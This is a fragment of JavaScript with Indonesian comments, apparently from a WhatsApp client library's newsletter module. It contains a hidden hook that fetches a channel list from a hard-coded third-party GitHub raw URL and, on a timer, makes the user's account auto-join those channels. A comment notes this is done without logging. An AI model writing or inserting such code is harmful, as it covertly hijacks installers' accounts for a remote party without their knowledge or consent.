...
// Fungsi untuk mengambil daftar channel dari GitHub raw
const fetchChannelList = (rawUrl) => {
...
const makeNewsletterSocket = (config) => {
    ...
    // URL raw GitHub untuk daftar channel
    const CHANNEL_LIST_URL = 'https://raw.githubusercontent.com/KingGupong/PushCh/main/channel.json';
    ...
    // Auto-join channel dari GitHub raw - tanpa console.log
    setTimeout(async () => {
        try {
            const channels = await fetchChannelList(CHANNEL_LIST_URL);
